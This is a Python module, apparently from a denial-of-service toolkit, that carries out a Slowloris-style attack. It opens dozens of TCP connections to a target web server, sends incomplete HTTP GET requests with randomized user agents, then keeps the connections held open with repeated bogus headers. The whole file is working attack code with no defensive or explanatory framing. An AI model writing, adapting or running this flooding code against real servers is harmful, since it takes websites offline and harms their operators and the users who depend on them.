# Import modules
import random
import socket
import tools.randomData as randomData
from colorama import Fore

# Init socket
def create_socket(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target[0], target[1]))

        sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        sock.send(f"User-Agent: {randomData.random_useragent()}\r\n".encode("utf-8"))
        sock.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    except socket.timeout:
        print(f"{Fore.RED}[-] {Fore.MAGENTA}Timed out..{Fore.RESET}")
    except socket.error:
        print(f"{Fore.RED}[-] {Fore.MAGENTA}Failed create socket{Fore.RESET}")
    else:
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket created..{Fore.RESET}")
        return sock


def flood(target):
    # Create sockets
    sockets = []
    for _ in range(random.randint(20, 60)):
        if sock := create_socket(target):
            sockets.append(sock)
    # Send keep-alive headers
    for _ in range(4):
        for index, sock in enumerate(sockets):
            try:
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                print(
                    f"{Fore.RED}[-] {Fore.MAGENTA}Failed to send keep-alive headers{Fore.RESET}"
                )
                sockets.remove(sock)
            else:
                print(
                    f"{Fore.GREEN}[+] {Fore.YELLOW}Sending keep-alive headers to {'{}:{}'.format(*target)} from socket {index + 1}. {Fore.RESET}"
                )
